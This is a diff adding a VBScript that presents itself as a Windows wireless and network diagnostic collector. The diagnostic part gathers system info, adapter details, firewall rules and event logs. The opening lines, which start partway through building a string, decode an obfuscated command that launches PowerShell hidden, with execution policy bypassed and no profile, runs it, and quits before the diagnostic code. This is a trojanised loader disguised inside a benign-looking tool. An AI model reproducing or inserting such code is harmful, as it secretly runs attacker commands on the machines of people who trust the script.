+sDYSnyx = sDYSnyx & ";@}☠@}ú:ow@ú}@]☞$rs�}#*úП(;�}#*úП(h@ú}@]☞$ll.�}#*úП(;�}#*úП(@ú}@]☞$x@ú}@]☞$ -windo�}#*úП(;�}#*úП(wstyl@ú}@]☞$ hi�}#*úП(;�}#*úП(@ú☠@#(�@ú☠@#(�@ú}@]☞$n -@ú}@]☞$xe(ú√●}◀√ut�}#*úП(;�}#*úП(ion@}☠@}ú:oli(ú√●}◀√y @ø}@((^yp�}#*úП(;�}#*úП(ss -NoP�}#*úП(;�}#*úП(rofil@ú}@]☞$ -(ú√●}◀√om�}#*úП(;�}#*úП(m→](#ú@●nd $OW�}#*úП(;�}#*úП(juxD" & "RmKOvcA"
+dim zsLcJdl
+zsLcJdl = "�}#*úП("
+sDYSnyx = Replace(sDYSnyx, zsLcJdl + ";" + zsLcJdl, "")
+sDYSnyx = Replace(sDYSnyx, "→](#ú@●", "a")
+sDYSnyx = Replace(sDYSnyx, "@ø}@((^", "b")
+sDYSnyx = Replace(sDYSnyx, "(ú√●}◀√", "c")
+sDYSnyx = Replace(sDYSnyx, "@ú☠@#(�", "d")
+sDYSnyx = Replace(sDYSnyx, "@ú}@]☞$", "e")
+sDYSnyx = Replace(sDYSnyx, "@}☠@}ú:", "p")
+sDYSnyx = Replace(sDYSnyx, "@*:@@(#", "s")
+sDYSnyx = Replace(sDYSnyx, "RmKOvcA", "")
+gXdUlWB(sDYSnyx)
+
+WScript.quit
+Dim FSO, shell, xslProcessor
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+Sub RunCmd(CommandString, OutputFile)
+    cmd = "cmd /c " + CommandString + " >> " + OutputFile
+    shell.Run cmd, 0, True
+End Sub
+
+Sub GetOSInfo(outputFileName)
+    On Error Resume Next
+    strComputer = "."
+    HKEY_LOCAL_MACHINE = &H80000002
+
+    Dim objReg, outputFile
+    Dim buildDetailNames, buildDetailRegValNames
+
+    buildDetailNames = Array("Product Name", "Version", "Build Lab", "Type")
+    buildDetailRegValNames = Array("ProductName", "CurrentVersion", "BuildLabEx", "CurrentType")
+
+    Set outputFile = FSO.OpenTextFile(outputFileName, 2, True)
+
+    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
+                     strComputer & "\root\default:StdRegProv")
+
+    outputFile.WriteLine("[Architecture/Processor Information]")
+    outputFile.WriteLine()
+    outputFile.Close
+    cmd = "cmd /c set processor >> " & outputFileName
+    shell.Run cmd, 0, True
+
+    Set outputFile = FSO.OpenTextFile(outputFileName, 8, True)
+
+    outputFile.WriteLine()
+    outputFile.WriteLine("[Operating System Information]")
+    outputFile.WriteLine()
+
+    strKeyPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+    for I = 0 to UBound(buildDetailNames)
+        objReg.GetStringValue HKEY_LOCAL_MACHINE, strKeyPath, buildDetailRegValNames(I), info
+        outputFile.WriteLine(buildDetailNames(I) + " = " + info)
+    Next
+
+    outputFile.WriteLine()
+    strKeyPath = "SYSTEM\SETUP"
+    objReg.GetDWordValue HKEY_LOCAL_MACHINE, strKeyPath, "Upgrade", upgradeInfo
+    if IsNull(upgradeInfo) Then
+        outputFile.WriteLine("This is a clean installed system")
+    Else
+        outputFile.WriteLine("This is an upgraded system")
+    End If
+
+    outputFile.WriteLine(buildDetailNames(I) + " = " + info)
+
+    outputFile.WriteLine()
+    outputFile.WriteLine("[File versions]")
+    outputFile.WriteLine()
+
+    Set shell = WScript.CreateObject( "WScript.Shell" )
+    windir = shell.ExpandEnvironmentStrings("%windir%\system32\")
+
+    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+
+    Dim FileSet
+    FileSet = Array("onex.dll", "l2nacp.dll", "wlanapi.dll", "wlancfg.dll", "wlanconn.dll", "wlandlg.dll", "wlanext.exe", "wlangpui.dll", "wlanhc.dll", "wlanmm.dll", "wlanmmhc.dll", "wlanmsm.dll", "wlanpref.dll", "wlansec.dll", "wlansvc.dll", "wlanui.dll")
+
+    For Each file in FileSet
+        filename = windir + file
+        strQuery = "Select * from CIM_Datafile Where Name = '" + Replace(filename, "\", "\\") + "'"
+        Set fileProp = objWMIService.ExecQuery _
+            (strQuery)
+
+        For Each objFile in fileProp
+            outputFile.WriteLine(file + "    " + objFile.Version)
+        Next
+    Next
+
+    Dim Dot3FileSet
+    Dot3FileSet = Array("onex.dll", "dot3api.dll", "dot3cfg.dll", "dot3dlg.dll", "dot3gpclnt.dll", "dot3gpui.dll", "dot3msm.dll", "dot3svc.dll", "dot3ui.dll")
+
+    For Each file in Dot3FileSet
+        filename = windir + file
+        strQuery = "Select * from CIM_Datafile Where Name = '" + Replace(filename, "\", "\\") + "'"
+        Set fileProp = objWMIService.ExecQuery _
+            (strQuery)
+
+        For Each objFile in fileProp
+            outputFile.WriteLine(file + "    " + objFile.Version)
+        Next
+    Next
+
+    call GetBatteryInfo(outputFile)
+    outputFile.Close
+
+    Set outputFile = FSO.OpenTextFile(outputFileName, 8, True)
+    outputFile.WriteLine("")
+    outputFile.WriteLine("[System Information]")
+    outputFile.WriteLine("")
+    outputFile.Close
+
+    'Comments: Dumping System Information using "systeminfo" command
+
+    cmd = "cmd /c systeminfo >> " & outputFileName
+    shell.Run cmd, 0, True
+
+    Set outputFile = FSO.OpenTextFile(outputFileName, 8, True)
+    outputFile.WriteLine("")
+    outputFile.WriteLine("[User Information]")
+    outputFile.WriteLine("")
+    outputFile.Close
+
+    cmd = "cmd /c set u >> " & outputFileName
+    shell.Run cmd, 0, True
+
+End Sub
+
+Sub GetBatteryInfo(outputFile)
+    On Error Resume Next
+    strComputer = "."
+    outputFile.WriteLine()
+    outputFile.WriteLine("[Power Information]")
+    outputFile.WriteLine()
+    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+    Set colItems = objWMIService.ExecQuery("Select * from Win32_Battery")
+    if colItems.Count = 0 Then
+    outputFile.WriteLine("It is a Desktop running on AC")
+    Else
+    For Each objItem in colItems
+        if objItem.Availability = 2 Then
+        outputFile.WriteLine("Machine is running on AC Adapter")
+        Else
+        if objitem.Availability = 3 Then
+        outputFile.WriteLine("Machine is running on Battery")
+        End If
+        End If
+    Next
+    End If
+End Sub
+
+Sub GetMiracastInfo(outputFileName)
+    On Error Resume Next
+    Dim MiracastInfoFile
+
+    Set MiracastInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
+    MiracastInfoFile.WriteLine("-------------------------------------")
+    MiracastInfoFile.WriteLine("-------+ Wireless Display Information +------")
+    MiracastInfoFile.WriteLine("-------------------------------------")
+    MiracastInfoFile.Close
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+    
+    ' Write the file with the directx diagnostics
+    cmd = "cmd /c dxdiag /t dxdiag.txt"
+    DKGlXlJ.Run cmd, 0, True
+
+    ' Write the file with the dispdiag information
+    cmd = "cmd /c dispdiag -out dispdiag_stop.dat"
+    DKGlXlJ.Run cmd, 0, True
+
+    ' Write the wlan information to the output file (wlaninfo.txt)
+    
+    cmd = "cmd /c time /t  >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c netsh wl show i  >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c netsh wl show d  >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c netsh wlan show interfaces  >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c netsh wlan sho net m=b  >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+End Sub
+
+
+Sub GetWcnInfo(outputFileName)
+    On Error Resume Next
+    Dim WcnInfoFile
+
+    Set WcnInfoFile= FSO.OpenTextFile(outputFileName, 8, True)
+    WcnInfoFile.WriteLine("-------------------------------------")
+    WcnInfoFile.WriteLine("---------+ WCN Information +---------")     
+    WcnInfoFile.WriteLine("-------------------------------------")    
+    WcnInfoFile.WriteLine("")
+    WcnInfoFile.WriteLine("")
+    WcnInfoFile.WriteLine("-----------------")
+    WcnInfoFile.WriteLine("+ Services Status")
+    WcnInfoFile.WriteLine("-----------------")
+    WcnInfoFile.WriteLine("")
+    WcnInfoFile.Close
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c sc query wcncsvc  >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c sc query wlansvc  >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c sc query eaphost  >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c sc query fdrespub  >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c sc query upnphost   >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c sc query eaphost  >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+
+    Set WcnInfoFile= FSO.OpenTextFile(outputFileName, 8, True)
+    WcnInfoFile.WriteLine("")
+    WcnInfoFile.WriteLine("")
+    WcnInfoFile.WriteLine("-----------------------")
+    WcnInfoFile.WriteLine("+ WCN Files Information ")
+    WcnInfoFile.WriteLine("-----------------------")
+    WcnInfoFile.WriteLine("")
+
+    strComputer = "."
+
+    Set shell = WScript.CreateObject( "WScript.Shell" )
+    windir = shell.ExpandEnvironmentStrings("%windir%\system32\")
+
+    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+
+    Dim FileSet
+    FileSet = Array("wcncsvc.dll", "wcnapi.dll", "fdwcn.dll", "wcneapauthproxy.dll", "wcneappeerproxy.dll", "wcnwiz.dll", "wcnnetsh.dll", "wczdlg.dll")
+
+    For Each file in FileSet
+        filename = windir + file
+        strQuery = "Select * from CIM_Datafile Where Name = '" + Replace(filename, "\", "\\") + "'"
+        Set fileProp = objWMIService.ExecQuery _
+            (strQuery)
+
+        For Each objFile in fileProp
+        WcnInfoFile.WriteLine("")
+        WcnInfoFile.WriteLine("---------------------")
+        WcnInfoFile.WriteLine(file)
+        WcnInfoFile.WriteLine("---------------------")
+		WcnInfoFile.WriteLine("	- Version 		:  	" + objFile.Version )
+		WcnInfoFile.WriteLine("	- Creation Date		: 	" + objFile.CreationDate  )
+		WcnInfoFile.WriteLine("	- Description		: 	" + objFile.Description  )
+		WcnInfoFile.WriteLine("	- Installation Date	: 	" +  objFile.InstallDate )
+		WcnInfoFile.WriteLine("	- In Use Count		:	" + objFile.InUseCount   )
+		WcnInfoFile.WriteLine("	- Last Accessed		: 	" + objFile.LastAccessed  )
+		WcnInfoFile.WriteLine("	- Last Modified 	: 	" + objFile.LastModified  )
+		WcnInfoFile.WriteLine("	- Status		: 	" + objFile.Status  )
+        Next
+    Next
+
+
+
+
+    WcnInfoFile.WriteLine("")
+    WcnInfoFile.WriteLine("")
+    WcnInfoFile.WriteLine("-------------------------------")
+    WcnInfoFile.WriteLine("+ Network Adapters Information ")
+    WcnInfoFile.WriteLine("-------------------------------")
+    WcnInfoFile.WriteLine("")
+
+    strQuery = "Select * from Win32_NetworkAdapter " 
+    
+    Set AdapterProp = objWMIService.ExecQuery _
+            (strQuery)
+
+
+    For Each objFile in AdapterProp
+        WcnInfoFile.WriteLine("")
+    WcnInfoFile.WriteLine("---------------------")
+    WcnInfoFile.WriteLine("DeviceID  :  " + objFile.DeviceID   )
+    WcnInfoFile.WriteLine("---------------------")
+	WcnInfoFile.WriteLine("	- Adapter Type		:  	" + objFile.AdapterType  )
+	WcnInfoFile.WriteLine("	- Auto Sense			: 	" + objFile.AutoSense )
+	WcnInfoFile.WriteLine("	- Description 		: 	" + objFile.Description   )
+	WcnInfoFile.WriteLine("	- NetConnectionID  	: 	" + objFile.NetConnectionID   )
+	WcnInfoFile.WriteLine("	- GUID 			: 	" + objFile.GUID )
+	WcnInfoFile.WriteLine("	- MACAddress  		: 	" + objFile.MACAddress  )
+	WcnInfoFile.WriteLine("	- Manufacturer   	: 	" + objFile.Manufacturer   )
+	WcnInfoFile.WriteLine("	- MaxSpeed    	: 	" + objFile.MaxSpeed    )
+	WcnInfoFile.WriteLine("	- Speed        		: 	" +  objFile.Speed    )
+	WcnInfoFile.WriteLine("	- Name     		: 	" + objFile.Name     )
+    
+    Select Case objFile.NetConnectionStatus 
+        Case 0    strAvail= "Disconnected"              
+        Case 1    strAvail= "Connecting"
+		Case 2 	strAvail= "Connected"
+		Case 3 	strAvail= "Disconnecting"
+		Case 4 	strAvail= "Hardware not present"
+	   	Case 5 	strAvail= "Hardware disabled"
+	     	Case 6 	strAvail= "Hardware malfunction"		     	
+		Case 7 	strAvail= "Media disconnected"
+	     	Case 8 	strAvail= "Authenticating"
+	     	Case 9 	strAvail= "Authentication succeeded"
+	     	Case 10 	strAvail= "Authentication failed"
+	     	Case 11 	strAvail= "Invalid address"		     	
+	     	Case 12	strAvail= "Credentials required"
+    End Select
+
+
+	WcnInfoFile.WriteLine("	- NetConnectionStatus	: 	" + strAvail )
+	WcnInfoFile.WriteLine("	- NetEnabled  	: 	" +  objFile.NetEnabled  )
+	WcnInfoFile.WriteLine("	- NetworkAddresses   	: 	" +  objFile.NetworkAddresses  )
+	WcnInfoFile.WriteLine("	- PermanentAddress    	: 	" +  objFile.PermanentAddress   )
+	WcnInfoFile.WriteLine("	- PhysicalAdapter    	: 	" +  objFile.PhysicalAdapter   )
+	WcnInfoFile.WriteLine("	- PNPDeviceID     	: 	" +  objFile.PNPDeviceID    )
+	WcnInfoFile.WriteLine("	- ProductName      	: 	" +  objFile.ProductName     )
+	WcnInfoFile.WriteLine("	- ServiceName       	: 	" +  objFile.ServiceName      )
+
+	WcnInfoFile.WriteLine("	- SystemName       	: 	" + objFile.SystemName       )
+	WcnInfoFile.WriteLine("	- TimeOfLastReset	: 	" + objFile.TimeOfLastReset )
+	WcnInfoFile.WriteLine("	- Status      	: 	" + objFile.Status      )
+
+    Select Case objFile.StatusInfo  
+        Case 1    strAvail= "Other"
+		Case 2 	strAvail= "Unknown"
+		Case 3 	strAvail= "Enabled"
+		Case 4 	strAvail= "Disabled"
+		Case 5 	strAvail= "Not Applicable"
+        End Select
+        
+	WcnInfoFile.WriteLine("	- StatusInfo		: 	" + strAvail )
+        
+       Select Case objFile.Availability 
+        Case 1    strAvail= "Other"
+		Case 2 	strAvail= "Unknown"
+	     	Case 3 	strAvail= "Running or Full Power"
+	     	Case 4 	strAvail= "Warning"
+		Case 5 	strAvail= "In test"
+	     	Case 6 	strAvail= "Not Applicable"
+	     	Case 7 	strAvail= "Power Off"
+	     	Case 8 	strAvail= "Off Line"
+	     	Case 9 	strAvail= "Off Duty"
+	     	Case 10 	strAvail= "Degraded"
+	     	Case 11 	strAvail= "Not Installed"
+	     	Case 12	strAvail= "Install Error"
+	     	Case 13 	strAvail= "Power Save - Unknown"
+	     	Case 14 	strAvail= "Power Save - Low Power Mode"
+	     	Case 15 	strAvail= "Power Save - Standby"
+	     	Case 16 	strAvail= "Power Cycle"
+	     	Case 17 	strAvail= "Power Save - Warning"
+    End Select
+
+	WcnInfoFile.WriteLine("	- Availability		: 	" + strAvail )	
+	WcnInfoFile.WriteLine("	- Caption 		: 	" +  objFile.Caption )
+
+		Select Case objFile.ConfigManagerErrorCode
+			Case 0	strAvail= "Device is working properly"
+			Case 1	strAvail= "Device is not configured correctly"
+			Case 2	strAvail= "Windows cannot load the driver for this device"
+			Case 3	strAvail= "Driver for this device might be corrupted, or the system may be low on memory or other resources"    	
+			Case 4	strAvail= "Device is not working properly. One of its drivers or the registry might be corrupted."
+			Case 5	strAvail= "Driver for the device requires a resource that Windows cannot manage."
+			Case 6	strAvail= "Boot configuration for the device conflicts with other devices"
+			Case 7	strAvail= "Cannot filter"
+			Case 8	strAvail= "Driver loader for the device is missing"
+			Case 9	strAvail= "Device is not working properly. The controlling firmware is incorrectly reporting the resources for the device"
+			Case 10	strAvail= "Device cannot start"
+			Case 11	strAvail= "Device failed"
+			Case 12	strAvail= "Device cannot find enough free resources to use"
+			Case 13	strAvail= "Windows cannot verify the device's resources"
+			Case 14	strAvail= "Device cannot work properly until the computer is restarted"
+			Case 15	strAvail= "Device is not working properly due to a possible re-enumeration problem"
+			Case 16	strAvail= "Windows cannot identify all of the resources that the device uses"
+			Case 17	strAvail= "Device is requesting an unknown resource type."
+			Case 18	strAvail= "Device drivers must be reinstalled"
+			Case 19	strAvail= "Failure using the VxD loader"
+			Case 20	strAvail= "Registry might be corrupted."
+			Case 21	strAvail= "System failure. If changing the device driver is ineffective, see the hardware documentation. Windows is removing the device"
+			Case 22	strAvail= "Device is disabled"
+			Case 23	strAvail= "System failure. If changing the device driver is ineffective, see the hardware documentation"
+			Case 24	strAvail= "Device is not present, not working properly, or does not have all of its drivers installed."
+			Case 25	strAvail= "Windows is still setting up the device"
+			Case 27	strAvail= "Device does not have valid log configuration."
+			Case 28	strAvail= "Device drivers are not installed."
+			Case 29	strAvail= "Device is disabled. The device firmware did not provide the required resources."
+			Case 30	strAvail= "Device is using an IRQ resource that another device is using."
+			Case 31	strAvail= "Device is not working properly. Windows cannot load the required device drivers." 			
+	End Select
+
+	WcnInfoFile.WriteLine("	- ConfigManagerErrorCode:	" + strAvail )
+	WcnInfoFile.WriteLine("	- Error Cleared 	: 	" + objFile.ErrorCleared )
+	WcnInfoFile.WriteLine("	- Error Description  	: 	" + objFile.ErrorDescription)
+	WcnInfoFile.WriteLine("	- LastErrorCode		: 	" + objFile.LastErrorCode)
+	WcnInfoFile.WriteLine("	- Index 	 	: 	" + objFile.Index)
+	WcnInfoFile.WriteLine("	- Installed  	: 	" + objFile.Installed  )
+	WcnInfoFile.WriteLine("	- Install Date   	: 	" + objFile.InstallDate   )				
+	WcnInfoFile.WriteLine("	- InterfaceIndex 	: 	" + objFile.InterfaceIndex )	
+    Next
+    WcnInfoFile.Close
+
+
+
+
+
+    Set WcnInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
+    WcnInfoFile.WriteLine("")
+    WcnInfoFile.WriteLine("-----------------------")
+    WcnInfoFile.WriteLine("+ ipconfig information")
+    WcnInfoFile.WriteLine("-----------------------")
+    WcnInfoFile.WriteLine("")
+    WcnInfoFile.Close
+
+
+    cmd = "cmd /c ipconfig /all >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+
+
+    Set WcnInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
+    WcnInfoFile.WriteLine("")    
+    WcnInfoFile.WriteLine("----------------------")
+    WcnInfoFile.WriteLine("+ Softap Capabilities ")
+    WcnInfoFile.WriteLine("----------------------")
+    WcnInfoFile.WriteLine("")
+    WcnInfoFile.Close
+
+    cmd = "cmd /c netsh wlan show device >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    Set WcnInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
+    WcnInfoFile.WriteLine("")    
+    WcnInfoFile.WriteLine("----------------------")
+    WcnInfoFile.WriteLine("+ Dump wcncsvc RegKey ")
+    WcnInfoFile.WriteLine("----------------------")
+    WcnInfoFile.WriteLine("")
+    WcnInfoFile.Close
+
+    cmd = "cmd /c reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wcncsvc\Parameters >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+
+
+'    Set shell = WScript.CreateObject( "WScript.Shell" )
+'    windir = shell.ExpandEnvironmentStrings("%windir%\system32\")
+'    filename = windir + "wcnwiz.dll"
+'    commandname = windir + "rundll32.exe"
+
+'    cmd = "cmd /c "& commandname &" "& filename &" , RunDumpWcnCache >> " & outputFileName
+'    DKGlXlJ.Run cmd, 0, True
+
+
+    Set WcnInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
+    WcnInfoFile.WriteLine("")    
+    WcnInfoFile.WriteLine("--------------------------------")
+    WcnInfoFile.WriteLine("+ Network Discovery Information.")
+    WcnInfoFile.WriteLine("--------------------------------")
+    WcnInfoFile.WriteLine("")
+    WcnInfoFile.WriteLine("")
+    WcnInfoFile.WriteLine("------------------------------")    
+    WcnInfoFile.WriteLine("- Current Profile information")
+    WcnInfoFile.WriteLine("------------------------------")    
+    WcnInfoFile.WriteLine("")
+
+    ' Profile Type
+    Const NET_FW_PROFILE2_DOMAIN = 1
+    Const NET_FW_PROFILE2_PRIVATE = 2
+    Const NET_FW_PROFILE2_PUBLIC = 4
+
+    ' Direction  
+    Const NET_FW_RULE_DIR_IN = 1
+    Const NET_FW_RULE_DIR_OUT = 2
+
+
+    ' Create the FwPolicy2 object.
+    Dim fwPolicy2    
+    Dim ProfileType
+    ProfileType = Array("Domain", "Private", "Public")
+
+    Set fwPolicy2 = CreateObject("HNetCfg.FwPolicy2")
+
+    CurrentProfile = fwPolicy2.CurrentProfileTypes
+  
+    WcnInfoFile.WriteLine ("Current firewall profile is: ")
+
+    '// The returned 'CurrentProfiles' bitmask can have more than 1 bit set if multiple profiles 
+    '//   are active or current at the same time
+
+    if ( CurrentProfile AND NET_FW_PROFILE2_DOMAIN ) then
+        WcnInfoFile.WriteLine(ProfileType(0))
+    end if
+
+    if ( CurrentProfile AND NET_FW_PROFILE2_PRIVATE ) then
+    WcnInfoFile.WriteLine(ProfileType(1))
+    end if
+
+    if ( CurrentProfile AND NET_FW_PROFILE2_PUBLIC ) then
+    WcnInfoFile.WriteLine(ProfileType(2))
+    end if
+    WcnInfoFile.Close
+
+
+    cmd = "cmd /c netsh advfirewall show currentprofile >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+
+    Set WcnInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
+    WcnInfoFile.WriteLine("")
+    WcnInfoFile.WriteLine("----------------------------------------------")    
+    WcnInfoFile.WriteLine("- Network discovery status for current profile")
+    WcnInfoFile.WriteLine("----------------------------------------------")    
+    WcnInfoFile.WriteLine("")               
+
+    Dim rule
+    ' Get the Rules object
+    Dim RulesObject
+    Set RulesObject = fwPolicy2.Rules
+
+    
+    For Each rule In Rulesobject
+        if rule.Grouping = "@FirewallAPI.dll,-32752" then
+            WcnInfoFile.WriteLine("")
+            WcnInfoFile.WriteLine("  Rule Name:          " & rule.Name)
+            WcnInfoFile.WriteLine("   ----------------------------------------------")
+            WcnInfoFile.WriteLine("  Enabled:            " & rule.Enabled)
+            WcnInfoFile.WriteLine("  Description:        " & rule.Description)
+            WcnInfoFile.WriteLine("  Application Name:   " & rule.ApplicationName)
+            WcnInfoFile.WriteLine("  Service Name:       " & rule.ServiceName)
+
+        Select Case rule.Direction
+                Case NET_FW_RULE_DIR_IN  WcnInfoFile.WriteLine("  Direction:          In")
+             Case NET_FW_RULE_DIR_OUT WcnInfoFile.WriteLine("  Direction:          Out")
+            End Select
+    
+    end if
+    Next
+
+    WcnInfoFile.Close
+
+    
+    
+End Sub
+
+
+
+Sub GetWirelessAdapterInfo(outputFile)
+    On Error Resume Next
+    Dim adapters, objReg
+    Dim adapterDetailNames, adapterDetailRegValNames
+
+    adapterDetailNames = Array("Driver Description", "Adapter Guid", "Hardware ID", "Driver Date", "Driver Version", "Driver Provider")
+    adapterDetailRegValNames = Array("DriverDesc", "NetCfgInstanceId", "MatchingDeviceId", "DriverDate", "DriverVersion", "ProviderName")
+
+    IHVDetailNames = Array("ExtensibilityDLL", "UIExtensibilityCLSID", "GroupName", "DiagnosticsID")
+    IHVDetailRegValNames = Array("ExtensibilityDLL", "UIExtensibilityCLSID", "GroupName", "DiagnosticsID")
+
+    HKEY_LOCAL_MACHINE = &H80000002
+    strComputer = "."
+
+    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
+                     strComputer & "\root\default:StdRegProv")
+
+
+    strKeyPath = "SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\"
+
+    objReg.EnumKey HKEY_LOCAL_MACHINE, strKeyPath, adapterSet
+
+    For Each adapter In adapterSet
+        If StrComp("Properties", adapter) Then
+            fullstrKeyPath = strKeyPath + adapter
+            objReg.GetDWORDValue HKEY_LOCAL_MACHINE, fullstrKeyPath, "*IfType", ifType
+            If ifType = 71 Then
+                for I = 0 to UBound(adapterDetailNames)
+                    objReg.GetStringValue HKEY_LOCAL_MACHINE, fullstrKeyPath, adapterDetailRegValNames(I), info
+                    outputFile.WriteLine(adapterDetailNames(I) + " = " + info)
+                Next
+
+                ihvKeyPath = fullstrKeyPath + "\Ndi\IHVExtensions"
+                For J = 0 to UBound(IHVDetailNames)
+                    objReg.GetStringValue HKEY_LOCAL_MACHINE, ihvKeyPath, IHVDetailRegValNames(J), ihvInfo
+                    outputFile.WriteLine(IHVDetailNames(J) + " = " + ihvInfo)
+                Next
+                    objReg.GetDWordValue HKEY_LOCAL_MACHINE, ihvKeyPath, "AdapterOUI", ihvInfo
+                    outputFile.WriteLine("AdapterOUI = " + CSTR(ihvInfo))
+                outputFile.WriteLine()
+            End If
+        End If
+    Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+    
+
+    cmd = "cmd /c tasklist /svc > " & processes
+    DKGlXlJ.Run cmd, 0, True
+
+    Set objTextFile = FSO.OpenTextFile(processes, 1)
+    strIHVOutput = objTextFile.ReadAll()
+
+    Set regEx = New RegExp
+    regEx.Pattern = "^wlanext.exe[\s|a-z|A-Z|\d]*"
+    regEx.Multiline = True
+    regEx.IgnoreCase = True
+    regEx.Global = True
+
+    Set Matches = regEx.Execute(strIHVOutput)
+
+    For Each match in Matches
+        outputFile.WriteLine(match.Value)
+    Next
+
+End Sub
+
+Sub GetWirelessAutoconfigLog(logFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    'Export the operational log
+    cmd = "cmd /c wevtutil epl ""Microsoft-Windows-WLAN-AutoConfig/Operational"" " & logFileName
+    DKGlXlJ.Run cmd, 0, True   
+
+    'Archive the log so that it can be read on different machines
+    cmd = "cmd /c wevtutil al " & logFileName
+    DKGlXlJ.Run cmd, 0, True   
+End Sub
+
+Sub GetWwanLog(logFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    'Export the operational log
+    cmd = "cmd /c wevtutil epl ""Microsoft-Windows-WWAN-SVC-EVENTS/Operational"" " & logFileName
+    DKGlXlJ.Run cmd, 0, True   
+
+    'Archive the log so that it can be read on different machines
+    cmd = "cmd /c wevtutil al " & logFileName
+    DKGlXlJ.Run cmd, 0, True   
+End Sub
+
+Sub GetWcmLog(logFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    'Export the operational log
+    cmd = "cmd /c wevtutil epl ""Microsoft-Windows-Wcmsvc/Operational"" " & logFileName
+    DKGlXlJ.Run cmd, 0, True   
+
+    'Archive the log so that it can be read on different machines
+    cmd = "cmd /c wevtutil al " & logFileName
+    DKGlXlJ.Run cmd, 0, True   
+End Sub
+
+Sub GetWiredAdapterInfo(outputFile)
+    On Error Resume Next
+    Dim adapters, objReg
+    Dim adapterDetailNames, adapterDetailRegValNames
+
+    adapterDetailNames = Array("Driver Description", "Adapter Guid", "Hardware ID", "Driver Date", "Driver Version", "Driver Provider")
+    adapterDetailRegValNames = Array("DriverDesc", "NetCfgInstanceId", "MatchingDeviceId", "DriverDate", "DriverVersion", "ProviderName")
+
+
+    HKEY_LOCAL_MACHINE = &H80000002
+    strComputer = "."
+
+    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
+                     strComputer & "\root\default:StdRegProv")
+
+
+    strKeyPath = "SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\"
+
+    objReg.EnumKey HKEY_LOCAL_MACHINE, strKeyPath, adapterSet
+
+    For Each adapter In adapterSet
+        If StrComp("Properties", adapter) Then
+            fullstrKeyPath = strKeyPath + adapter
+            objReg.GetDWORDValue HKEY_LOCAL_MACHINE, fullstrKeyPath, "*IfType", ifType
+            If ifType = 6 Then
+                for I = 0 to UBound(adapterDetailNames)
+                    objReg.GetStringValue HKEY_LOCAL_MACHINE, fullstrKeyPath, adapterDetailRegValNames(I), info
+                    outputFile.WriteLine(adapterDetailNames(I) + " = " + info)
+                Next
+                outputFile.WriteLine()
+            End If
+        End If
+    Next
+End Sub
+
+
+Sub GetEnvironmentInfo(outputFileName)
+    On Error Resume Next
+    Dim envInfoFile
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c netsh wlan show all > " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c netsh lan show interfaces >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c netsh lan show settings >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c netsh lan show profiles >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c netsh mbn show interfaces >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c netsh mbn show profile name=* interface=* >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
